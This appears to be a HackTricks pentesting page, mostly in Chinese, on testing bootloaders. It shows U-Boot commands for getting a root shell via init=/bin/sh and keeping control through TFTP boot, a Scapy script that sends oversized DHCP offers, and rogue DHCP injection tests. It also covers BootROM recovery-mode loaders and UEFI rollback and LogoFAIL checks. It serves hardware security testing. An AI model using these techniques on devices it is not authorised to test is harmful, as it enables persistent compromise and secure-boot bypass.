# 引导加载程序测试

{{#include ../../banners/hacktricks-training.md}}

以下步骤建议用于修改设备启动配置并测试诸如 U-Boot 和 UEFI 类加载器的 bootloader。重点是获取早期代码执行、评估签名/回滚保护，并滥用恢复或网络启动路径。

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 快速技巧与环境滥用

1. Access the interpreter shell
- 在启动过程中，在 `bootcmd` 执行之前按下已知的中断键（通常是任意键、0、空格或板级特定的“magic”序列）以进入 U-Boot 提示符。

2. Inspect boot state and variables
- 有用命令：
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- 在 kernel 参数中追加 `init=/bin/sh`，让内核进入 shell 而不是正常的 init：
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- 配置网络并从局域网获取 kernel/fit 镜像：
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- 如果环境存储不是只读的，你可以持久化控制：
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- 检查诸如 `bootcount`、`bootlimit`、`altbootcmd`、`boot_targets` 之类会影响回退路径的变量。配置不当的值可能允许反复中断进入 shell。

6. Check debug/unsafe features
- 查找：`bootdelay` > 0、`autoboot` 被禁用、无限制的 `usb start; fatload usb 0:1 ...`、通过串口的 `loady`/`loads`、从不受信任媒体 `env import`、以及在加载时未进行签名检查的 kernels/ramdisks。

7. U-Boot image/verification testing
- 如果平台声称对 FIT 镜像进行安全/验证启动，尝试 unsigned 和被篡改的镜像：
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- 缺少 `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` 或采用旧式 `verify=n` 行为通常允许引导任意 payload。

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot 的 legacy BOOTP/DHCP 处理曾存在内存安全问题。例如，CVE‑2024‑42040 描述了通过精心构造的 DHCP 响应在网络上将 U-Boot 内存中的字节 leak 回来的内存泄露。使用过长/边界值参数（option 67 bootfile-name、vendor options、file/servername 字段）对 DHCP/PXE 路径进行测试，观察是否出现挂起或 leak。
- 用于在 netboot 期间对启动参数施压的最小 Scapy 示例：
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 还要验证当链到 OS 端配置脚本时，PXE 文件名字段是否在传递给 shell/loader 逻辑时缺乏清理。

9. Rogue DHCP server command injection testing
- 部署一个 rogue DHCP/PXE 服务，尝试在 filename 或 options 字段注入字符以到达后续启动链中的命令解释器。Metasploit 的 DHCP auxiliary、`dnsmasq` 或自定义 Scapy 脚本都很有效。先确保将实验室网络隔离。

## SoC ROM 恢复模式（覆盖正常启动）

许多 SoC 提供一个 BootROM “loader” 模式，即使 flash 映像无效也会接受通过 USB/UART 传输的代码。如果 secure-boot fuses/OTP 未被烧录，这通常可以在链的很早阶段提供任意代码执行。

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

评估设备是否有 secure-boot eFuses/OTP 被烧录。如果没有，BootROM 下载模式通常会绕过任何更高层的验证（U-Boot、kernel、rootfs），直接从 SRAM/DRAM 执行你的第一阶段 payload。

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- 挂载 EFI System Partition (ESP) 并检查加载器组件：`EFI/Microsoft/Boot/bootmgfw.efi`、`EFI/BOOT/BOOTX64.efi`、`EFI/ubuntu/shimx64.efi`、`grubx64.efi`、vendor logo 路径。
- 如果 Secure Boot 的撤销列表（dbx）不是最新，尝试使用降级或已知存在漏洞的签名加载器组件。如果平台仍然信任旧的 shims/bootmanagers，通常可以从 ESP 加载自己的 kernel 或 `grub.cfg` 来获取持久性。

11. Boot logo parsing bugs (LogoFAIL class)
- 若干 OEM/IBV 固件在处理启动 logo 的 DXE 阶段存在图像解析缺陷。如果攻击者能够在 ESP 上的厂商特定路径（例如 `\EFI\<vendor>\logo\*.bmp`）放置精心构造的图像并重启，即使在启用了 Secure Boot 的情况下也可能在早期引导时触发代码执行。测试平台是否接受用户提供的 logo 以及这些路径是否可以从操作系统写入。

## 硬件注意事项

在早期启动期间操作 SPI/NAND flash（例如接地引脚以绕过读取）时要小心，并始终参考 flash 数据手册。时序错误的短接可能会损坏设备或编程器。

## 备注和额外提示

- 尝试 `env export -t ${loadaddr}` 和 `env import -t ${loadaddr}` 在 RAM 与存储之间移动环境 blob；一些平台允许从可移动媒体导入 env 而无需身份验证。
- 对于通过 `extlinux.conf` 启动的 Linux 系统，在没有签名检查的情况下，修改启动分区上的 `APPEND` 行（注入 `init=/bin/sh` 或 `rd.break`）通常就足够了以获取持久性。
- 如果 userland 提供 `fw_printenv/fw_setenv`，验证 `/etc/fw_env.config` 是否与真实的 env 存储匹配。配置错误的偏移会让你读/写错误的 MTD 区域。

## 参考资料

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
